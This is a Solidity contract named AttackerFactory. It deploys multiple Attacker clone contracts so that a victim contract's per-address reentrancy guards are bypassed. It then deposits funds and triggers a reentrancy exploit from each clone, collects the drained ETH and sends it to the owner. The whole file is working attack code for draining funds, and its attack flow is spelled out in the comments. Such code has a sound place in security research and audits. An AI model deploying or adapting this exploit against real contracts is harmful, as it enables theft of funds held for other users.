// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Attacker} from "./Attacker.sol";

/// @title AttackerFactory
/// @notice Deploys multiple Attacker clones to defeat per-address reentrancy
///         guards.  Each clone is a unique `msg.sender` from the victim's
///         perspective, so per-address guards (like `unknownac7ea680[caller]`)
///         have separate slots for each clone.
///
/// @dev    Attack flow:
///           1. deployClones(n)         — spin up n Attacker contracts
///           2. fundAndExploit(amount)  — deposit + exploit from every clone
///           3. collectAll()            — pull drained ETH to this factory
///           4. withdraw()              — send everything to the owner
contract AttackerFactory {
    error NotOwner();
    error WithdrawFailed();
    error InsufficientFunds();

    event CloneDeployed(uint256 indexed index, address clone);
    event CloneExploited(uint256 indexed index, address clone, uint256 drained);
    event Collected(uint256 total);

    address private immutable owner;
    address public victim;
    Attacker[] public clones;

    constructor(address _victim) {
        owner = msg.sender;
        victim = _victim;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    // -----------------------------------------------------------------
    // Deploy `count` independent Attacker contracts.
    // -----------------------------------------------------------------
    function deployClones(uint256 count) external onlyOwner {
        for (uint256 i; i < count; i++) {
            Attacker clone = new Attacker(victim);
            clones.push(clone);
            emit CloneDeployed(clones.length - 1, address(clone));
        }
    }

    // -----------------------------------------------------------------
    // Deposit + exploit from every clone in a single transaction.
    // Requires msg.value = depositPerClone * clones.length.
    // -----------------------------------------------------------------
    function fundAndExploit(uint256 depositPerClone) external payable onlyOwner {
        uint256 len = clones.length;
        if (msg.value < depositPerClone * len) revert InsufficientFunds();

        for (uint256 i; i < len; i++) {
            Attacker clone = clones[i];

            // Deposit into victim through this clone
            clone.depositToVictim{value: depositPerClone}();

            // Trigger the reentrancy exploit
            clone.exploit(depositPerClone);
        }
    }

    // -----------------------------------------------------------------
    // Pull drained ETH from all clones back to this factory.
    // -----------------------------------------------------------------
    function collectAll() external onlyOwner {
        uint256 total;
        uint256 len = clones.length;

        for (uint256 i; i < len; i++) {
            Attacker clone = clones[i];
            uint256 bal = address(clone).balance;
            if (bal > 0) {
                clone.withdraw();
                total += bal;
            }
        }
        emit Collected(total);
    }

    // -----------------------------------------------------------------
    // Send everything to the owner EOA.
    // -----------------------------------------------------------------
    function withdraw() external onlyOwner {
        uint256 bal = address(this).balance;
        (bool success,) = payable(owner).call{value: bal}("");
        if (!success) revert WithdrawFailed();
    }

    // -----------------------------------------------------------------
    // View helpers
    // -----------------------------------------------------------------
    function cloneCount() external view returns (uint256) {
        return clones.length;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
